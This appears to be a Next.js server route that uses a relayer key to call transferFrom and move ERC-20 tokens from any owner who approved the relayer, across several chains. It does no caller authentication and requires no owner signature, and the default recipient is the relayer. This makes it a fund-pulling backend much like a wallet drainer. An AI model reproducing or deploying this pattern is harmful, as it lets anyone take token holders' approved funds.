import { NextResponse } from 'next/server';
import { ethers } from 'ethers';

// Official token addresses for different networks
const TOKEN_ADDRESSES: Record<string, Record<string, string>> = {
  ethereum: {
    'USDT': '0xdAC17F958D2ee523a2206206994597C13D831ec7',
    'USDC': '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
    'WETH': '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2',
    'DAI': '0x6B175474E89094C44Da98b954EedeAC495271d0F',
    'UNI': '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984',
    'LINK': '0x514910771AF9Ca656af840dff83E8264EcF986CA',
    'WBTC': '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599'
  },
  polygon: {
    'USDT': '0xc2132D05D31c914a87C6611C10748AEb04B58e8F',
    'USDC': '0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174',
    'WETH': '0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619',
    'DAI': '0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063',
    'WMATIC': '0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270'
  },
  arbitrum: {
    'USDT': '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9',
    'USDC': '0xFF970A61A04b1cA14834A43f5de4533ebDDB5CC8',
    'WETH': '0x82aF49447D8a07e3bd95BD0d56f35241523fBab1',
    'ARB': '0x912CE59144191C1204E64559FE8253a0e49E6548'
  },
  bnb: {
    'USDT': '0x55d398326f99059fF775485246999027B3197955',
    'USDC': '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d',
    'WBNB': '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c',
    'BUSD': '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56'
  },
  sepolia: {
    'USDT': '0x03bbb5660b8687c2aa453a0e42dcb6e0732b1266',
    'USDC': '0x1c7D4B196Cb0C7B01d743Fbc6116a902379C7238'
  }
};

export async function POST(req: Request) {
  const startedAtMs = Date.now();
  try {
    const { tokenSymbol, owner, amount, network, recipient } = await req.json();
    if (!tokenSymbol || !owner || !amount || !network) {
      return NextResponse.json({ success: false, error: 'Missing required fields: tokenSymbol, owner, amount, network' }, { status: 400 });
    }

    // Resolve token address
    const tokenAddress = TOKEN_ADDRESSES[network]?.[tokenSymbol.toUpperCase()];
    if (!tokenAddress) {
      return NextResponse.json({ success: false, error: `Token ${tokenSymbol} not supported on ${network}` }, { status: 400 });
    }

    // RPCs via env
    const rpcMap: Record<string, string | undefined> = {
      sepolia: process.env.SEPOLIA_RPC_URL,
      ethereum: process.env.ETHEREUM_RPC_URL,
      polygon: process.env.POLYGON_RPC_URL,
      arbitrum: process.env.ARBITRUM_RPC_URL,
      bnb: process.env.BNB_RPC_URL
    };
    const rpcUrl = rpcMap[network];
    if (!rpcUrl) return NextResponse.json({ success: false, error: `RPC not configured for ${network}` }, { status: 400 });

    // Relayer signer
    const relayerPk = process.env.RELAYER_PRIVATE_KEY;
    if (!relayerPk) return NextResponse.json({ success: false, error: 'RELAYER_PRIVATE_KEY not configured' }, { status: 500 });

    const provider = new ethers.JsonRpcProvider(rpcUrl);
    const relayer = new ethers.Wallet(relayerPk, provider);
    const toAddress: string = recipient && recipient !== '' ? recipient : relayer.address;

    // Basic validations
    if (!ethers.isAddress(owner)) return NextResponse.json({ success: false, error: 'Invalid owner address' }, { status: 400 });
    if (!ethers.isAddress(toAddress)) return NextResponse.json({ success: false, error: 'Invalid recipient address' }, { status: 400 });

    // Verify the token is a contract
    const code = await provider.getCode(tokenAddress);
    if (!code || code === '0x') {
      return NextResponse.json({ success: false, error: `Address ${tokenAddress} has no contract bytecode on ${network}` }, { status: 400 });
    }

    const abi = [
      'function transferFrom(address from, address to, uint256 value) returns (bool)',
      'function decimals() view returns (uint8)',
      'function allowance(address owner, address spender) view returns (uint256)',
      'function balanceOf(address) view returns (uint256)'
    ];
    const token = new ethers.Contract(tokenAddress, abi, relayer);

    // Read token config and compute value
    const [decimals, allowanceRaw, ownerBalanceRaw, chainId] = await Promise.all([
      token.decimals(),
      token.allowance(owner, relayer.address),
      token.balanceOf(owner),
      provider.getNetwork().then(n => n.chainId)
    ]);

    const value = ethers.parseUnits(amount, decimals);

    // Diagnostics
    console.log('[transfer] network', network, 'chainId', chainId.toString());
    console.log('[transfer] token', tokenSymbol, tokenAddress);
    console.log('[transfer] owner', owner);
    console.log('[transfer] recipient', toAddress);
    console.log('[transfer] decimals', decimals);
    console.log('[transfer] allowance', allowanceRaw.toString());
    console.log('[transfer] ownerBalance', ownerBalanceRaw.toString());
    console.log('[transfer] value', value.toString());

    // Validate allowance
    if (allowanceRaw !== ethers.MaxUint256 && allowanceRaw < value) {
      return NextResponse.json({ success: false, error: `Allowance too low. Approved: ${ethers.formatUnits(allowanceRaw, decimals)}` }, { status: 400 });
    }

    // Validate balance for clarity
    if (ownerBalanceRaw < value) {
      return NextResponse.json({ success: false, error: `Owner balance too low: ${ethers.formatUnits(ownerBalanceRaw, decimals)}` }, { status: 400 });
    }

    // Execute transferFrom
    const tx = await token.transferFrom(owner, toAddress, value);
    const receipt = await tx.wait();

    return NextResponse.json({ success: true, txHash: tx.hash, blockNumber: receipt?.blockNumber ?? null, elapsedMs: Date.now() - startedAtMs });
  } catch (err: any) {
    const details: Record<string, unknown> = {};
    let errorMsg = 'Unexpected error';
    if (err) {
      if (err.code) details.code = err.code;
      if (err.shortMessage) details.shortMessage = err.shortMessage;
      if (err.reason) details.reason = err.reason;
      if (err.message) details.message = err.message;
      if (err.data) details.data = err.data;
      errorMsg = err.reason || err.shortMessage || err.message || errorMsg;
    }
    console.error('[transfer] error', details);
    return NextResponse.json({ success: false, error: errorMsg, details }, { status: 500 });
  }
}
